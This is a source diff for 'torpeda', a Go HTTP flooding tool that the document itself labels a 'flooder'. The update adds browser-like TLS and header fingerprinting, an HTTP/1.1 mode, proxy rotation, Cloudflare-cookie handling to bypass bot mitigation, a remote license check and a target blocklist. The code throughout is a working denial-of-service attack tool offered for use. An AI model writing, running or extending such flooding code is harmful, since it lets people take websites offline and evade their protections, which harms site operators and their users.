@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"net"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -23,34 +24,35 @@ import (
 )
 
 var supportedVersions = []uint16{
-	0xfafa,           // GREASE
-	tls.VersionTLS13, // TLS 1.3
-	tls.VersionTLS12, // TLS 1.2
+	0xfafa,           
+	tls.VersionTLS13, 
+	tls.VersionTLS12, 
 }
 
 var cipherSuites = []uint16{
-	0x3a3a, // GREASE
+	0x3a3a,
+	tls.TLS_AES_128_GCM_SHA256,                        
+	tls.TLS_AES_256_GCM_SHA384,                        
+	tls.TLS_CHACHA20_POLY1305_SHA256,                  
+	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,       
+	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,         
+	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,       
+	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,         
 	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
-	tls.TLS_CHACHA20_POLY1305_SHA256,
-	tls.TLS_AES_256_GCM_SHA384,
-	tls.TLS_AES_128_GCM_SHA256,
+	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,   
+	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,            
+	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,          
+	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,               
+	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,              
+	tls.TLS_RSA_WITH_AES_128_CBC_SHA,                 
+	tls.TLS_RSA_WITH_AES_256_CBC_SHA,                
 }
 
 var supportedGroups = []tls.CurveID{
-	tls.X25519,    // 0x001d
-	tls.CurveP256, // 0x0017 (secp256r1)
-	tls.CurveP384, // 0x0018 (secp384r1)
+	25497,
+	tls.X25519,   
+	tls.CurveP256, 
+	tls.CurveP384, 
 }
 
 var (
@@ -63,12 +65,13 @@ var (
 	proxyFile     string
 	debug         bool
 	extra         bool
-	closeConn     bool
 	test          bool
 	redirect      bool
 	parsed        bool
 	cf            bool
+	usehttp1      bool
 	cookies       = ""
+	timeoutCount int
 	refererURL string
 	customCookie  string
 	customUserAgent string
@@ -76,7 +79,13 @@ var (
 	statusMap      = make(map[int]int)
 	statusMutex    sync.Mutex
 	customHeaders  = make(map[string]string)
+	licenseVerified = false
 )
+
+const licenseURL = "https://raw.githubusercontent.com/Pxttern/license-for-torpeda/main/license"
+const requiredLicense = "1337" 
+
+var blockedDomains = []string{".gov", ".by", ".ua"}
 
 var randomReferers = []string{
 	"https://google.com",
@@ -112,12 +121,73 @@ var (
 	}
 )
 
+func checkLicense() {
+	if licenseVerified {
+		return
+	}
+
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+		ForceAttemptHTTP2: false, 
+	}
+	client := &http.Client{
+		Timeout:   15 * time.Second,
+		Transport: tr,
+	}
+
+	resp, err := client.Get(licenseURL)
+	if err != nil {
+		fmt.Println("[#8] Whoops something went wrong pm @rapidreset")
+		os.Exit(1)
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	if strings.TrimSpace(string(body)) != requiredLicense {
+		fmt.Println("[#9] Whoops something went wrong pm @rapidreset")
+		os.Exit(1)
+	}
+
+	licenseVerified = true
+	fmt.Println("\033[32mlicense is valid\033[0m")
+}
+
+func isBlockedDomain(target string) bool {
+    parsedURL, err := url.Parse(target)
+    if err != nil {
+        os.Exit(1)
+    }
+
+    for _, domain := range blockedDomains {
+        if strings.HasSuffix(parsedURL.Hostname(), domain) {
+            return true
+        }
+    }
+    return false
+}
+
+func updateErrorCounters(err error) {
+    statusMutex.Lock()
+    defer statusMutex.Unlock()
+
+    if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+        timeoutCount++
+    }
+}
+
 func main() {
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
 	fmt.Print("\033[H\033[2J")
-	fmt.Println(`	[flooder - golang] torpeda v0.3 // Updated: 06.11.2024 // Made with love :D
+	fmt.Println(`	[flooder - golang] torpeda v0.4 // Updated: 10.11.2024 // Made with love :D
 	Developers to method: mitigations aka @rapidreset
+	Annoucement: @torpeda && github.com/pxttr
 	Features: bypass BFM, many options, support %RAND% in target, support rate like 4.7, support http/socks proxy
 	How to use & example:
 
@@ -135,6 +205,7 @@ func main() {
 	--referer "<string> or rand" - For custom referer ex: "https://www.google.com" (recommend rand)
 	--ua "<string>" - For custom useragent ex: "curl/4.0"
 	--cf - For sites who has protection based on check cf_clearence cookies
+	--http1 - For sites who have only http/1.1 
 	 `)
 	return
 }
@@ -147,27 +218,32 @@ func main() {
 	proxyFile = os.Args[6]
 
 	if !contains(validMethods, reqmethod) {
-		fmt.Println("[#1] Invalid request method")
+		fmt.Println("[#1] Request method can only GET/HEAD/POST/PUT/DELETE/CONNECT/OPTIONS/TRACE/PATCH")
 		os.Exit(1)
 	}
 
+	if isBlockedDomain(target) {
+        fmt.Println("[#2] This target in blacklist if this mistake pm @rapidreset")
+        os.Exit(1)
+    }
+
 	if !strings.HasPrefix(target, "https://") && !strings.HasPrefix(target, "http://") {
-		fmt.Println("[#2] Target must start with https:// or http://")
+		fmt.Println("[#3] Target must start with https:// or http://")
 		os.Exit(1)
 	}
 
 	if duration < 1 || duration > 86400 {
-		fmt.Println("[#3] Time must be between 1 and 86400 seconds")
+		fmt.Println("[#4] Time must be between 1 and 86400 seconds")
 		os.Exit(1)
 	}
 
 	if threads < 1 || threads > 512 {
-		fmt.Println("[#4] Threads must be between 1 and 512")
+		fmt.Println("[#5] Threads must be between 1 and 512")
 		os.Exit(1)
 	}
 
 	if rps < 0.1 || rps > 128 {
-		fmt.Println("[#5] Ratelimit must be between 0.1 and 128")
+		fmt.Println("[#6] Ratelimit must be between 0.1 and 128")
 		os.Exit(1)
 	}
 
@@ -199,9 +275,13 @@ func main() {
 			if i+1 < len(os.Args) {
 				refererURL = os.Args[i+1]
 			}
+		case "--http1":
+			usehttp1 = true
 		}
 	}
 
+	checkLicense()
+	
 	readProxies()
 
 	fmt.Println("Attack started!")
@@ -320,48 +400,78 @@ func parseCookies(resp *http.Response) {
 }
 
 func randomHeader() http.Header {
-	header := http.Header{
-		"cache-control":             []string{"max-age=0"},
-		"sec-ch-ua":                 []string{`"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"`},
-		"sec-ch-ua-mobile":          []string{"?0"},
-		"sec-ch-ua-platform":        []string{`"Windows"`},
-		"upgrade-insecure-requests": []string{"1"},
-		"accept":                    []string{`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`},
-		"sec-gpc":                   []string{"1"},
-		"accept-language":           []string{"en-US,en;q=0.7"},
-		"sec-fetch-mode":            []string{"navigate"},
-		"sec-fetch-user":            []string{"?1"},
-		"sec-fetch-dest":            []string{"document"},
-		"accept-encoding":           []string{"gzip, deflate, br, zstd"},
-		"priority":                  []string{"u=0, i"},
+	header := http.Header{}
+	parsedURL, err := url.Parse(target)
+	if err != nil {
+		os.Exit(1)
 	}
+	domain := parsedURL.Host 
 
-	if customUserAgent != "" {
-		header.Set("user-agent", customUserAgent)
+	if usehttp1 {
+		header = http.Header{
+			"Host": 					 []string{domain},
+			"Connection": 			     []string{"keep-alive"},
+			"Cache-Control":             []string{"max-age=0"},
+			"sec-ch-ua":                 []string{`"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"`},
+			"sec-ch-ua-mobile":          []string{"?0"},
+			"sec-ch-ua-platform":        []string{`"Windows"`},
+			"Upgrade-Insecure-Requests": []string{"1"},
+			"Accept":                    []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+			"Sec-Fetch-Mode":            []string{"navigate"},
+			"Sec-Fetch-User":            []string{"?1"},
+			"Sec-Fetch-Dest":            []string{"document"},
+			"Accept-Language":           []string{"en-US,en;q=0.7"},
+			"Accept-Encoding":           []string{"gzip, deflate, br, zstd"},
+		}
+		if customUserAgent != "" {
+			header.Set("user-agent", customUserAgent)
+		} else {
+			header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`)
+		}
 	} else {
-		header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`)
-	}
+		header = http.Header{
+			"cache-control":             []string{"max-age=0"},
+			"sec-ch-ua":                 []string{`"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"`},
+			"sec-ch-ua-mobile":          []string{"?0"},
+			"sec-ch-ua-platform":        []string{`"Windows"`},
+			"upgrade-insecure-requests": []string{"1"},
+			"accept":                    []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+			"sec-gpc":                   []string{"1"},
+			"accept-language":           []string{"en-US,en;q=0.7"},
+			"sec-fetch-mode":            []string{"navigate"},
+			"sec-fetch-user":            []string{"?1"},
+			"sec-fetch-dest":            []string{"document"},
+			"accept-encoding":           []string{"gzip, deflate, br, zstd"},
+			"priority":                  []string{"u=0, i"},
+		}
 
-	rand.Seed(time.Now().UnixNano())
-	if rand.Float64() < 0.43 {
-		header.Set("dnt", "1")
+		if customUserAgent != "" {
+			header.Set("user-agent", customUserAgent)
+		} else {
+			header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`)
+		}
 	}
-
-	if reqmethod != "POST" {
-        header.Set("content-length", "0")
-    }
 
 	if refererURL == "rand" {
 		rand.Seed(time.Now().UnixNano())
 		header.Set("referer", randomReferers[rand.Intn(len(randomReferers))])
 	} else if refererURL != "" {
-        header.Set("referer", refererURL)
-    }
+		header.Set("referer", refererURL)
+	}
 
-    ref := []string{"same-site", "same-origin", "cross-site"}
-    rand.Seed(time.Now().UnixNano())
-    secFetchSite := ref[rand.Intn(len(ref))]
-    header.Set("sec-fetch-site", secFetchSite)
+	if refererURL == "" {
+		header.Set("Sec-Fetch-Site", "none")
+	} else {
+		ref := []string{"same-site", "same-origin", "cross-site"}
+		rand.Seed(time.Now().UnixNano())
+		secFetchSite := ref[rand.Intn(len(ref))]
+		header.Set("Sec-Fetch-Site", secFetchSite)
+	}
+
+	if reqmethod == "POST" {
+		header.Set("content-length", "0")
+		header.Set("content-type", "application/json")
+	}
 
 	if cf {
 		cloudflareCookie := Cloudflarecookie()
@@ -372,22 +482,42 @@ func randomHeader() http.Header {
 		header.Set(key, value)
 	}
 
-	header[http.HeaderOrderKey] = []string{
-		"cache-control",
-		"sec-ch-ua",
-		"sec-ch-ua-mobile",
-		"sec-ch-ua-platform",
-		"upgrade-insecure-requests",
-		"user-agent",
-		"accept",
-		"sec-gpc",
-		"accept-language",
-		"sec-fetch-site",
-		"sec-fetch-mode",
-		"sec-fetch-user",
-		"sec-fetch-dest",
-		"accept-encoding",
-		"priority",
+	if usehttp1 {
+		header[http.HeaderOrderKey] = []string{
+			"host",
+			"connection",
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"accept-language",
+		}
+	} else {
+		header[http.HeaderOrderKey] = []string{
+			"cache-control",
+			"sec-ch-ua",
+			"sec-ch-ua-mobile",
+			"sec-ch-ua-platform",
+			"upgrade-insecure-requests",
+			"user-agent",
+			"accept",
+			"sec-gpc",
+			"accept-language",
+			"sec-fetch-site",
+			"sec-fetch-mode",
+			"sec-fetch-user",
+			"sec-fetch-dest",
+			"accept-encoding",
+			"priority",
+		}
 	}
 
 	return header
@@ -420,7 +550,7 @@ func processCustomCookie(cookie string) string {
 }
 
 func ResponseBody(resp *http.Response) {
-	const maxSize = 128 * 1
+	const maxSize = 128
 	limitedReader := io.LimitReader(resp.Body, maxSize)
 
 	if _, err := io.Copy(ioutil.Discard, limitedReader); err != nil {
@@ -453,84 +583,118 @@ func createRatePattern(rps float64) []time.Duration {
 }
 
 func start(proxy string) {
-    proxyType := detectProxyType(proxy)
+	proxyType := detectProxyType(proxy)
 
-    if proxyType == "http" || proxyType == "https" {
-        if !strings.HasPrefix(proxy, "http://") && !strings.HasPrefix(proxy, "https://") {
-            proxy = "http://" + proxy
-        }
-    }
+	if proxyType == "http" || proxyType == "https" {
+		if !strings.HasPrefix(proxy, "http://") && !strings.HasPrefix(proxy, "https://") {
+			proxy = "http://" + proxy
+		}
+	}
 
-    proxyClean := strings.TrimPrefix(proxy, proxyType+"://")
+	proxyClean := strings.TrimPrefix(proxy, proxyType+"://")
 
-    var transport *http.Transport
+	var transport *http.Transport
 
-    if proxyType == "socks5" || proxyType == "socks4" {
-        dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
-        transport = &http.Transport{
-            Dial: dialSocksProxy,
-        }
-    } else if proxyType == "http" || proxyType == "https" {
-        proxyURL, err := url.Parse(proxy)
-        if err != nil {
-            return
-        }
-        transport = &http.Transport{
-            Proxy: http.ProxyURL(proxyURL),
-        }
-    }
+	parsedURL, err := url.Parse(target)
+	if err != nil {
+		fmt.Println("Error parsing target URL:", err)
+		os.Exit(1)
+	}
 
-    currentTarget := strings.ReplaceAll(target, "%RAND%", randstr(10))
-    parsedURL, err := url.Parse(currentTarget)
+	if usehttp1 {
+		tlsConfig := &tls.Config{
+			ServerName:               parsedURL.Host,
+			MinVersion:               supportedVersions[len(supportedVersions)-1],
+			MaxVersion:               supportedVersions[0],
+			CurvePreferences:         supportedGroups,
+			CipherSuites:             cipherSuites,
+			ClientSessionCache:       tls.NewLRUClientSessionCache(0),
+			NextProtos:               []string{"http/1.1"}, 
+			PreferServerCipherSuites: false,
+			InsecureSkipVerify:       true,
+		}
+
+		if proxyType == "socks5" || proxyType == "socks4" {
+			dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
+			transport = &http.Transport{
+				Dial:            dialSocksProxy,
+				TLSClientConfig: tlsConfig,
+			}
+		} else {
+			proxyURL, err := url.Parse(proxy)
+			if err != nil {
+				return
+			}
+			transport = &http.Transport{
+				Proxy:           http.ProxyURL(proxyURL),
+				TLSClientConfig: tlsConfig,
+			}
+		}
+	} else {
+		tlsConfig := &tls.Config{
+			ServerName:               parsedURL.Host,
+			MinVersion:               supportedVersions[len(supportedVersions)-1],
+			MaxVersion:               supportedVersions[0],
+			CurvePreferences:         supportedGroups,
+			CipherSuites:             cipherSuites,
+			ClientSessionCache:       tls.NewLRUClientSessionCache(0),
+			NextProtos:               []string{"h2", "http/1.1"},
+			PreferServerCipherSuites: false,
+			InsecureSkipVerify:       true,
+		}
+
+		if proxyType == "socks5" || proxyType == "socks4" {
+			dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
+			transport = &http.Transport{
+				Dial:            dialSocksProxy,
+				TLSClientConfig: tlsConfig,
+			}
+		} else {
+			proxyURL, err := url.Parse(proxy)
+			if err != nil {
+				return
+			}
+			transport = &http.Transport{
+				Proxy:           http.ProxyURL(proxyURL),
+				TLSClientConfig: tlsConfig,
+			}
+		}
+
+		transport_http2, err := http2.ConfigureTransports(transport)
+		if err != nil {
+			return
+		}
+
+		transport.MaxIdleConns = 0
+		transport.MaxIdleConnsPerHost = 0
+		
+		transport_http2.Settings = settingsFrame
+		transport_http2.SettingsOrder = settingsFrameOrder
+		transport_http2.PseudoHeaderOrder = pseudoHeaderOrder
+		transport_http2.ConnectionFlow = connectionFlow
+		transport.H2transport = transport_http2
+	}
+
+	client := &http.Client{
+		Timeout:   time.Second * 5,
+		Transport: transport,
+	}
+
+	if redirect {
+		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+			if len(via) >= 10 {
+				return http.ErrUseLastResponse
+			}
+			if debug {
+				log.Printf("Redirect %s", req.URL.String())
+			}
+			return nil
+		}
+	}
+
+    req, err := http.NewRequest(reqmethod, target, nil)
     if err != nil {
-        fmt.Println("Error parsing target URL:", err)
-        os.Exit(1)
-    }
-
-    var tlsConfig = &tls.Config{
-        ServerName:               parsedURL.Host,
-        MinVersion:               supportedVersions[len(supportedVersions)-1],
-        MaxVersion:               supportedVersions[0],
-        CurvePreferences:         supportedGroups,
-        CipherSuites:             cipherSuites,
-        ClientSessionCache:       tls.NewLRUClientSessionCache(0),
-        NextProtos:               []string{"h2", "http/1.1"},
-        PreferServerCipherSuites: false,
-        InsecureSkipVerify:       true,
-    }
-
-    transport.ForceAttemptHTTP2 = true
-    transport_http2, err := http2.ConfigureTransports(transport)
-    if err != nil {
-        return
-    }
-
-    transport_http2.Settings = settingsFrame
-    transport_http2.SettingsOrder = settingsFrameOrder
-    transport_http2.PseudoHeaderOrder = pseudoHeaderOrder
-    transport_http2.ConnectionFlow = connectionFlow
-    transport.H2transport = transport_http2
-    transport.TLSClientConfig = tlsConfig
-
-    client := &http.Client{
-        Timeout:   time.Second * 10,
-        Transport: transport,
-    }
-
-    if redirect {
-        client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
-            if len(via) >= 10 {
-                return http.ErrUseLastResponse
-            }
-            if debug {
-                log.Printf("Redirect %s", req.URL.String())
-            }
-            return nil
-        }
-    }
-
-    req, err := http.NewRequest(reqmethod, currentTarget, nil)
-    if err != nil {
+		updateErrorCounters(err) 
         return
     }
 
@@ -566,11 +730,9 @@ func start(proxy string) {
         go func() {
             defer wg.Done()
             for range ticker.C {
-                currentTarget := strings.ReplaceAll(target, "%RAND%", randstr(10))
-                req.URL, _ = url.Parse(currentTarget)
-
                 resp, err := client.Do(req)
-                if err != nil {
+				if err != nil {
+					updateErrorCounters(err)
                     continue
                 }
                 updateStatusMap(resp.StatusCode)
@@ -589,53 +751,73 @@ func updateStatusMap(statusCode int) {
 }
 
 func printStatuses() {
-	startTime := time.Now()
-	totalRequests := 0
+    startTime := time.Now()
+    totalRequests := 0
 
-	for debug {
-		time.Sleep(time.Second)
-		statusMutex.Lock()
+    for debug {
+        time.Sleep(time.Second)
+        statusMutex.Lock()
 
-		fmt.Print("\033[H\033[2J")
-		fmt.Println("> Attack Informations:")
-		fmt.Println("> Version: v0.3")
-		fmt.Println("> Request Method:", reqmethod)
-		fmt.Println("> Target:", target)
-		fmt.Println("> Time:", duration)
-		fmt.Println("> Threads:", threads)
-		fmt.Println("> Ratelimit:", rps)
+        fmt.Print("\033[H\033[2J")
+fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣆⠀⠀⠀⣾⣿⣿⣿⣷⠄⠀⠰⠤⣀⠀⠀⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠃⢺⣿⣿⣿⣿⡄⠀⠀⣿⣿⢿⣿⣿⣦⣦⣦⣶⣼⣭⣼⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣷⡆⠂⣿⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢙⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⣿⠟⠻⣿⣿⣿⣿⡿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⢿⣿⣿⣿⣿⡄⣿⣿⣿⣿⣿⣿⡀⢀⣿⣿⣿⣿⠀⢸⣿⣿⠅⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⡀⣠⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠠⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣻⣿⣿⣿⣿⣿⡟⠋⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠙⢿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠿⢿⡿⠛⠋⠁⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣅⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⣿⡟⠃⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀
+⠀⠜⢠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣦⠄⣠⠀
+⠠⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠛⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⢳⣾⣿⣿⣿⣿⣿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿`)
+        fmt.Println("> Version: v0.4")
+        fmt.Println("> Request Method:", reqmethod)
+        fmt.Println("> Target:", target)
+        fmt.Println("> Time:", duration)
+        fmt.Println("> Threads:", threads)
+        fmt.Println("> Ratelimit:", rps)
 
-		currentTime := time.Now()
-		elapsedTime := currentTime.Sub(startTime).Seconds()
-		averageRPS := float64(totalRequests) / elapsedTime
-		remainingTime := float64(duration) - elapsedTime
+        currentTime := time.Now()
+        elapsedTime := currentTime.Sub(startTime).Seconds()
+        averageRPS := float64(totalRequests) / elapsedTime
+        remainingTime := float64(duration) - elapsedTime
 
-		if remainingTime < 0 {
-			remainingTime = 0
-		}
-	
-		var codes []int
-		for code := range statusMap {
-			codes = append(codes, code)
-		}
-		sort.Ints(codes)
+        if remainingTime < 0 {
+            remainingTime = 0
+        }
 
-		fmt.Println(`[-] Detailed Options [-]`)
+        var codes []int
+        for code := range statusMap {
+            codes = append(codes, code)
+        }
+        sort.Ints(codes)
 
-		statusString := "Status Codes:"
-		for _, code := range codes {
-			statusString += fmt.Sprintf(" [%d: %d]", code, statusMap[code])
-		}
+        statusString := "Status Codes:"
+        for _, code := range codes {
+            statusString += fmt.Sprintf(" [%d: %d]", code, statusMap[code])
+        }
 
-		fmt.Printf("%s\n", statusString)
-		fmt.Printf("Average Requests: %.2f Per Second\n", averageRPS)
-		fmt.Printf("Attack End After: %.f Seconds\n", remainingTime)
+        statusString += fmt.Sprintf(" [H2_CLOSE: %d]", timeoutCount)
 
-		for _, count := range statusMap {
-			totalRequests += count
-		}
-		statusMap = make(map[int]int)
+        fmt.Printf("%s\n", statusString)
 
-		statusMutex.Unlock()
-	}
+        fmt.Printf("Average Requests: %.2f Per Second\n", averageRPS)
+        fmt.Printf("Attack End After: %.f Seconds\n", remainingTime)
+
+        for _, count := range statusMap {
+            totalRequests += count
+        }
+
+        statusMap = make(map[int]int)
+        statusMutex.Unlock()
+    }
 }
